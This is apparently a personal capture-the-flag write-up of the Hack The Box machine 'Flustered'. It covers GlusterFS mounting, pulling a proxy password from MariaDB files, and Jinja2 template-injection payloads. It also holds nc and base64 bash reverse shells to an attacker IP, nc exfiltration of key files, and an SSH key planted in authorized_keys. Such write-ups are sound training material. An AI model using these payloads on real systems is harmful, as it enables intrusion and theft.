# /usr/lib/ssl not under /etc/ssl/
# /var/lib/snapd/desktop/applications/storage-explorer_storage-explorer.desktop
## Writeup
https://0xdf.gitlab.io/2022/02/09/htb-flustered.html

### Squid
* https://github.com/A1vinSmith/OSCP-PWK/tree/master/PgPractice/Windows/Squid

```
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
```

```bash
❯ python3 spose.py --proxy http://$IP:3128 --target $IP
Using proxy address http://10.129.225.107:3128

no ports specified

curl --proxy http://$IP:3128 http://$IP 
```

Although, not going any further as Squid proxy requires authentication.

### GlusterFS
    Preferably, your storage environment should be located on a safe segment of your network where firewall is not necessary. In the real world, that simply isn’t possible for all environments. If you are willing to accept the potential performance loss of running a firewall, you need to know that Gluster makes use of the following ports:

        24007 TCP for the Gluster Daemon
        24008 TCP for Infiniband management (optional unless you are using IB)
        One TCP port for each brick in a volume. So, for example, if you have 4 bricks in a volume, port 24009 – 24012 would be used in GlusterFS 3.3 & below, 49152 - 49155 from GlusterFS 3.4 & later.
        38465, 38466 and 38467 TCP for the inline Gluster NFS server.
        Additionally, port 111 TCP and UDP (since always) and port 2049 TCP-only (from GlusterFS 3.4 & later) are used for port mapper and should be open.

These ports line up almost exactly with what nmap showed.

That says that 49152 and 49153 are for each for bricks in the volume, which implies this is GlusterFS 3.4+, and there are at least two bricks.

##### Enumerate Volumes
```bash
❯ gluster --remote-host=$IP volume list
ERROR: failed to create logfile "/var/log/glusterfs/cli.log" (Permission denied)
ERROR: failed to open logfile /var/log/glusterfs/cli.log
[2023-01-24 01:12:51.321158 +0000] I [cli.c:828:main] 0-cli: Started running gluster with version 10.3
[2023-01-24 01:12:51.321291 +0000] I [cli.c:702:cli_rpc_init] 0-cli: Connecting to remote glusterd at 10.129.225.107
vol1
vol2
[2023-01-24 01:12:51.913811 +0000] I [input.c:31:cli_batch] 0-: Exiting with: 0

❯ sudo gluster --remote-host=$IP volume list
vol1
vol2
```

##### Mount vol2
```bash
❯ sudo mount -t glusterfs $IP:/vol2 /mnt
Mount failed. Check the log file  for more details.
```

The log file (`/var/log/glusterfs/mnt.log` or under `/var/log/glusterfs`) shows additional information about the mount failure, which
seems to be caused by a DNS resolution error:

The last line before “Final graph” says “DNS resolution failed on host flustered”.

```bash
[2023-01-24 01:17:22.855068 +0000] E [name.c:267:af_inet_client_get_remote_sockaddr] 0-vol2-client-0: DNS resolution failed on host flustered
Final graph:
+------------------------------------------------------------------------------+
```

```bash
echo "10.129.225.107 flustered.htb flustered" | sudo tee -a /etc/hosts
```

```bash
❯ sudo mount -t glusterfs $IP:/vol2 /mnt
❯ sudo ls -l /mnt
total 122934
-rw-rw---- 1 sshd tss     16384 Oct 26  2021 aria_log.00000001
-rw-rw---- 1 sshd tss        52 Oct 26  2021 aria_log_control
-rw-r--r-- 1 root root        0 Oct 26  2021 debian-10.3.flag
-rw-rw---- 1 sshd tss       998 Jan 29  2022 ib_buffer_pool
-rw-rw---- 1 sshd tss  12582912 Oct 26  2021 ibdata1
-rw-rw---- 1 sshd tss  50331648 Oct 26  2021 ib_logfile0
-rw-rw---- 1 sshd tss  50331648 Oct 26  2021 ib_logfile1
-rw-rw---- 1 sshd tss  12582912 Jan 24 13:18 ibtmp1
-rw-rw---- 1 sshd tss         0 Oct 26  2021 multi-master.info
drwx------ 2 sshd tss      4096 Oct 26  2021 mysql
-rw-rw---- 1 root root       16 Oct 26  2021 mysql_upgrade_info
drwx------ 2 sshd tss      4096 Oct 26  2021 performance_schema
drwx------ 2 sshd tss      4096 Oct 26  2021 squid
-rw-rw---- 1 sshd tss     24576 Jan 24 13:18 tc.log
```

### Enumerate the mnt
Some Googling of the file names in that directly suggest that this is the `/var/lib/mysql` directory, which is where MariaDB (MySQL) stores it’s data. This directory actually has everything I need to recreate the database locally. Althouhg, that's the hard way to retrive the password.

##### Hard way
```
mkdir /tmp/mysql
cp -R /mnt/* /tmp/mysql/
echo -e "[mariadb]\nplugin-load-add = auth_socket.so" > /tmp/socket.cnf
docker run --name mariadb -v /tmp/socket.cnf:/etc/mysql/mariadb.conf.d/socket.cnf -v
/tmp/mysql:/var/lib/mysql -d mariadb:10.3.31
docker exec -ti mariadb mysql
```

##### Easy way
The passwd.ibd file has what looks like a username amd a name:

If “Lance Friedman” is the name, and “lance.friedman” is the username, the string in the middle is “o>WJ5-jD<5^m3”, and there’s another string, “infimum”. It’s even more clear in `xxd` (with `grep -vF` to remove the lines of completely unprintable characters):

```bash
❯ sudo cat /mnt/squid/passwd.ibd
        �▒�@!��������������������������&&������������������������       �▒��G�x�▒�NG�x�▒�Nw��▒�����������������������������������i������������������������������������������������������������������������������������������������������������������������������������������������������i���������������������������������������������������������������������������������������������������������������������������������w��▒�ׯm%��������▒��E�����2infimum
��lance.friedman�o>WJ5-jD<5^m3�Lance Friedmanpc�m%▒��%                                                                                                                                            ❯ sudo xxd /mnt/squid/passwd.ibd | grep -vF "................"
00000030: 0006 0000 0040 0000 0021 0000 0004 0000  .....@...!......
00000080: ffff ffff 0000 0000 0001 0000 0002 0026  ...............&
00000090: 0000 0002 0026 0000 0000 0000 0000 ffff  .....&..........
00004000: 47d2 78df 0000 0001 0000 0000 0000 0000  G.x.............
00004010: 0000 0000 0018 ca4e 0005 0000 0000 0000  .......N........
00007ff0: 0000 0000 0000 0000 47d2 78df 0018 ca4e  ........G.x....N
00008000: 771e baac 0000 0002 0000 0000 0000 0000  w...............
00008070: 69d2 0000 0003 ffff ffff ffff ffff ffff  i...............
00008130: 69d2 ffff ffff ffff ffff ffff ffff ffff  i...............
0000bff0: 0000 0000 0000 0000 771e baac 0018 d2d7  ........w.......
0000c000: af6d 0625 0000 0003 ffff ffff ffff ffff  .m.%............
0000c010: 0000 0000 0018 e3cd 45bf 0000 0000 0000  ........E.......
0000c050: 0002 00f2 0000 0005 0000 0002 0032 0100  .............2..
0000c060: 0200 1f69 6e66 696d 756d 0002 000b 0000  ...infimum......
0000c070: 7375 7072 656d 756d 000e 0d0e 0000 0010  supremum........
0000c080: ffee 6c61 6e63 652e 6672 6965 646d 616e  ..lance.friedman
0000c090: 0000 0000 0000 8000 0000 0000 006f 3e57  .............o>W
0000c0a0: 4a35 2d6a 443c 355e 6d33 814c 616e 6365  J5-jD<5^m3.Lance
0000c0b0: 2046 7269 6564 6d61 6e00 0000 0000 0000   Friedman.......
0000fff0: 0000 0000 0070 0063 af6d 0625 0018 e3cd  .....p.c.m.%....


❯ sudo strings /mnt/squid/passwd.ibd
infimum
supremum
lance.friedman
o>WJ5-jD<5^m3
Lance Friedman
```

### Auth Squid
Trying the different potential passwords from above, “infimum” and “supremum” both return the same invalid Squid page as previously seen. The other one does not:

```bash
❯ curl --proxy http://lance.friedman:o\>WJ5-jD\<5\^m3@$IP:3128 http://$IP/

    <html>
    <head>
    <title>steampunk-era.htb - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
```
That's the 127.0.0.1:80 page. view-source:http://10.129.225.107/

The proxy allows us to access the web server at http://127.0.0.1, which shows the default Nginx welcome page. This suggests that the local server listening on `127.0.0.1:80`, which is enabled by default in `/etc/nginx/sites-enabled/default` on Debian systems, has not been disabled

```bash
❯ curl --proxy http://lance.friedman:o\>WJ5-jD\<5\^m3@$IP:3128 http://127.0.0.1
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

### Directory Fuzz
##### feroxbuster
```bash
feroxbuster -u http://127.0.0.1 -p 'http://lance.friedman:o>WJ5-jD<5^m3@10.129.225.107:3128'
```

301      GET        7l       12w      185c http://127.0.0.1/app => http://127.0.0.1/app/
301      GET        7l       12w      185c http://127.0.0.1/app/templates => http://127.0.0.1/app/templates/
301      GET        7l       12w      185c http://127.0.0.1/app/config => http://127.0.0.1/app/config/
301      GET        7l       12w      185c http://127.0.0.1/app/static => http://127.0.0.1/app/static/

There’s an app directory, with templates, config, and static. This structure feels a lot like what you see with Python or Ruby frameworks, or maybe even Node. I’ll run again on the app directory, looking for those kinds of files, as well as html, as that’s what I expect in the templates directory:

```bash
feroxbuster -u http://127.0.0.1  -x py,js,rb,html -p 'http://lance.friedman:o>WJ5-jD<5^m3@10.129.225.107:3128'
```

##### gobuster
gobuster (notice that we have to URL-encode some characters in order to get a valid userinfo )
```bash
❯ gobuster dir -u http://127.0.0.1 --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.225.107:3128' -w /usr/share/wordlists/dirb/common.txt

/app                  (Status: 301) [Size: 185] [--> http://127.0.0.1/app/]

❯ gobuster dir -u http://127.0.0.1/app --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.225.107:3128' -w /usr/share/wordlists/dirb/common.txt
❯ gobuster dir -u http://127.0.0.1/app --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.225.107:3128' -w /usr/share/wordlists/dirb/common.txt -x py

/app.py               (Status: 200) [Size: 748]
```

### app.py
```bash
curl --proxy http://lance.friedman:o\>WJ5-jD\<5\^m3@$IP:3128 http://127.0.0.1/app/app.py
```

### SSTI
```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{7*7}}"}' http://flustered.htb

<title>49 - Coming Soon</title>
```

```python
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
>>> import requests
>>> res = requests.post('http://flustered.htb', json={"siteurl": "{{8*8}}"})
>>> print(res.text)

    <html>
    <head>
    <title>64 - Coming Soon</title>...
    </html>
```

### RCE
Let try Jinja2 first since it is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on a Flask application.

```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{config.items()}}"}' http://flustered.htb
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{settings.SECRET_KEY}}"}' http://flustered.htb
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{7*\"7\"}}"}' http://flustered.htb

<title>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, None), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, None), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(seconds=43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)]) - Coming Soon</title>
```

It's more likely to be Jinja2.

payloadallthethings first as I remmebered last time that worked well.

```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\"id\").read()}}"}' http://flustered.htb

curl -H 'Content-Type: application/json' -d '{"siteurl":"{{ cycler.__init__.__globals__.os.popen(\"id\").read() }}"}' http://flustered.htb
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{ joiner.__init__.__globals__.os.popen(\"id\").read() }}"}' http://flustered.htb
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{ namespace.__init__.__globals__.os.popen(\"id\").read() }}"}' http://flustered.htb
```
above didn't work.

But read files worked.

```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{ request.__class__._load_form_data.__globals__.__builtins__.open(\"/etc/passwd\").read() }}"}' http://flustered.htb
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{ request.__class__._load_form_data.__globals__.__builtins__.open(\"/home/jennifer/.ssh/id_rsa\").read() }}"}' http://flustered.htb
```
ssh key reading is not working. As the box designed to have a lateral movement step to Jennifer. It won't give it so easy.

Then I'll just go a reverse shell to try it. L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjEyLzgwIDA+JjE=

```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{ namespace.__init__.__globals__.os.popen(\"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjEyLzgwIDA+JjE= | base64 -d | sh\").read() }}' http://flustered.htb
```

Failed

##### Calling Popen without guessing the offset
```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").popen(\"ls\").read()}}{%endif%}{% endfor %}"}' http://flustered.htb

app.py
config
__pycache__
static
templates
wsgi.py

curl -H 'Content-Type: application/json' -d '{"siteurl":"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").popen(\"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjEyLzgwIDA+JjE= | base64 -d | sh\").read()}}{%endif%}{% endfor %}"}' http://flustered.htb
```
bash encoded shell not working, 

let's try nc. It works
```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.12 80 >/tmp/f\").read()}}{%endif%}{% endfor %}"}' http://flustered.htb
```

0xdf used python interactive to get shell. It seems a good way to get rid of encoding.

Anyway, HackTricks won this round https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#rce-escaping

```bash
❯ nc -lvnp 80
listening on [any] 80 ...

connect to [10.10.16.12] from (UNKNOWN) [10.129.96.232] 41628
bash: cannot set terminal process group (670): Inappropriate ioctl for device
bash: no job control in this shell
www-data@flustered:~/html/app$ 
www-data@flustered:~/html/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@flustered:~/html/app$ python --version
python --version
Python 2.7.16
www-data@flustered:~/html/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@flustered:~/html/app$ ^Z
[1]  + 23055 suspended  nc -lvnp 80
❯ stty raw -echo; fg
[1]  + 23055 continued  nc -lvnp 80
                                   id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@flustered:~/html/app$ stty rows 48 columns 194
```

### Lateral movement 
##### Enumeration
www-data can read files in `/etc/ssl` (which isn’t the default config):

```bash
www-data@flustered:~/html/app$ ls -l /etc/ssl
total 44
drwxr-xr-x 2 root root 16384 Jan 28  2022 certs
-rw-r--r-- 1 root root  4060 Nov 25  2021 glusterfs.ca
-rw-r--r-- 1 root root  3243 Nov 25  2021 glusterfs.key
-rw-r--r-- 1 root root  1822 Nov 25  2021 glusterfs.pem
-rw-r--r-- 1 root root 11118 Aug 24  2021 openssl.cnf
drwx------ 2 root root  4096 Jan 28  2022 private

localhost:/vol1 on /home/jennifer type fuse.glusterfs (rw,nosuid,relatime,user_id=0,group_id=0,default_permissions,allow_other,max_read=131072,_netdev,x-systemd.automount)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
```

All three files(`.ca`, `.key` and `.pem`) are world-readable (including glusterfs.key , which is not by default, meaning its permissions were changed), so we can copy them to our local `/etc/ssl` directory. This allows us to mount the vol1 volume from our attacking machine.

##### Mount Vol1
```bash
www-data@flustered:~/html/app$ ls -l /etc/ssl/glusterfs*
-rw-r--r-- 1 root root 4060 Nov 25  2021 /etc/ssl/glusterfs.ca
-rw-r--r-- 1 root root 3243 Nov 25  2021 /etc/ssl/glusterfs.key
-rw-r--r-- 1 root root 1822 Nov 25  2021 /etc/ssl/glusterfs.pem
www-data@flustered:~/html/app$ nc -w 3 10.10.16.12 443 < /etc/ssl/glusterfs.ca
www-data@flustered:~/html/app$ nc -w 3 10.10.16.12 443 < /etc/ssl/glusterfs.key
www-data@flustered:~/html/app$ nc -w 3 10.10.16.12 443 < /etc/ssl/glusterfs.pem

❯ nc -lp 443 > glusterfs.key
❯ nc -lp 443 > glusterfs.pem
❯ ls -l
-rw-r--r-- 1 kali kali  4060 Jan 26 13:53 glusterfs.ca
-rw-r--r-- 1 kali kali  3243 Jan 26 13:54 glusterfs.key
-rw-r--r-- 1 kali kali  1822 Jan 26 13:54 glusterfs.pem
```

-t, --types <list>      limit the set of filesystem types

```bash
mount -t glusterfs flustered.htb:/vol1 /mnt
```

Other writeups won't work here, at least for me. Maybe that's the reason why it only has 2 stars for review.

After checking `/var/log/glusterfs/..log`. Those three files need to be put under `/usr/lib/ssh/...`. Yours maybe different as I tested on a default Kali 2023 January.

### SSH
```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys
```

### Privilege Escalation
##### Enum
The `/var/backups` directory contains a key file which is readable by the jennifer group:
```bash
FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
jennifer@flustered:~$ ls -l /var/backups/key
-rw-r----- 2 root jennifer 89 Oct 26  2021 /var/backups/key
```

/proc is mounted with hidepid=2, which means that I can only see processes running as jennifer:
```bash ssh
jennifer@flustered:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,relatime,hidepid=2)

jennifer@flustered:~$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
jennifer  1422  0.0  0.2  21160  9024 ?        Ss   01:21   0:00 /lib/systemd/systemd --user
jennifer  1437  0.0  0.1   7916  4740 pts/0    Ss   01:21   0:00 -bash
jennifer  1500  0.0  0.0  10632  3116 pts/0    R+   01:33   0:00 ps auxww
```

`ip a` shows that we're in the docker.
##### Identify Container by ping sweep
```bash
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5b:d5:f9:67 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5bff:fed5:f967/64 scope link 
       valid_lft forever preferred_lft forever

jennifer@flustered:~$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.062 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.082 ms
```

Alternatively Nmap binary or `proxychains namp`.

##### Port Scan Container
```bash
jennifer@flustered:~$ time nc -zvn 172.17.0.2 1-65535
(UNKNOWN) [172.17.0.2] 10000 (webmin) open

real    0m5.869s
user    0m4.357s
sys     0m1.480s
```

##### Port 10000
```bash
jennifer@flustered:~$ curl 172.17.0.2:10000
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Error>
  <Code>InvalidQueryParameterValue</Code>
  <Message>Value for one of the query parameters specified in the request URI is invalid.
RequestId:9af620d8-69f2-44ca-b8b9-22c884d430fb
Time:2023-01-26T01:49:53.193Z</Message>
```

Azure blob Storage via REST API after googled.

* https://learn.microsoft.com/en-us/dotnet/api/azure.storage.blobs.models.bloberrorcode.invalidqueryparametervalue?view=azure-dotnet
* https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azurite?tabs=visual-studio
* https://learn.microsoft.com/en-us/azure/vs-azure-tools-storage-manage-with-storage-explorer?tabs=windows

### Azure Storage 
In fact, port 10000 is used as default port by the Azurite emulator. https://learn.microsoft.com/en-us/azure/vs-azure-tools-storage-manage-with-storage-explorer?toc=%2Fazure%2Fstorage%2Fblobs%2Ftoc.json&bc=%2Fazure%2Fstorage%2Fblobs%2Fbreadcrumb%2Ftoc.json&tabs=windows#local-storage-emulator

To be able to interact with the Azure Storage instance, we need to download and install the Azure Storage Explorer application. We use SSH local port forwarding to access the service locally.

* https://snapcraft.io/docs/installing-snap-on-kali
* https://snapcraft.io/storage-explorer

Fix "Cannot communicate with server: Post http://localhost/v2/apps: dial unix /run/snapd.socket: connect: no such file or directory"

* https://snapcraft.io/docs/installing-snap-on-kali
* https://askubuntu.com/questions/1258137/cannot-communicate-with-server-post-http-localhost-v2-apps-dial-unix-run-sn

```bash
❯ sudo apt install snapd
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
snapd is already the newest version (2.57.6-1+b1).

❯ systemctl enable --now snapd
Created symlink /etc/systemd/system/multi-user.target.wants/snapd.service → /lib/systemd/system/snapd.service.

❯ sudo snap install storage-explorer
[sudo] password for kali: 
2023-01-26T15:39:52+13:00 INFO Waiting for automatic snapd restart...
storage-explorer 1.27.2 from Microsoft Azure Storage Tools (msft-storage-tools✓) installed
WARNING: There is 1 new warning. See 'snap warnings'.
```

```bash
ssh -N -L10000:172.17.0.2:10000 jennifer@flustered.htb

ssh jennifer@flustered.htb -L 10000:172.17.0.2:10000
```

Finally, when the Azure Storage Explorer app is done installing on your Linux PC, the process is not complete. You must finish up the process by connecting Azure Storage Explorer to the Gnome Keyring using the snap connect command.

https://www.addictivetips.com/ubuntu-linux-tips/install-the-microsoft-azure-storage-explorer-on-linux/

```bash
❯ snap connect storage-explorer:password-manager-service :password-manager-service
WARNING: There is 1 new warning. See 'snap warnings'.
❯ snap warnings
last-occurrence:  today at 15:39 NZDT
warning: |
  the snapd.apparmor service is disabled; snap applications will likely not start.
  Run "systemctl enable --now snapd.apparmor" to correct this.
```

Okay, it seems that I have to enable and start both snapd and the apparmor services
```bash
systemctl enable --now snapd apparmor
```

Storage Explorer requires the use of a password manager, which may need to be connected manually before Storage Explorer will work correctly. You can connect Storage Explorer to your system's password manager with the following command:
```bash
snap connect storage-explorer:password-manager-service :password-manager-service
```

If you're in Kali like me in 2023, you won't be able to find the storate-explorer app in the launcher. Since Kali is using ZSH by default.
https://askubuntu.com/questions/910821/programs-installed-via-snap-not-showing-up-in-launcher

I'm too lazy to amend it. So just found the app and run it:
```bash
/var/lib/snapd/desktop/applications/storage-explorer_storage-explorer.desktop
```

Click the "Plug" button and add a new connection to a Local Storage Emulator:

Failed due to know issue: https://stackoverflow.com/questions/72984288/invalidheadervalue-error-in-adls2-blob-trigger-function-c-sharp

If you are using azurite (Storage emulator) while executing the function locally then this is a known issue.

* https://github.com/microsoft/AzureStorageExplorer/releases?page=1 <- Tried diff versions no luck
* https://stackoverflow.com/questions/71558801/visual-studio-2022-with-azurite-integrated-v3-14-1-in-creation-of-local-blob-c <- need to downgrade the azurite SDK version to get rid of the `InvalidHeaderValue` runtime error.

HTB need to update it. The current writeup is broken.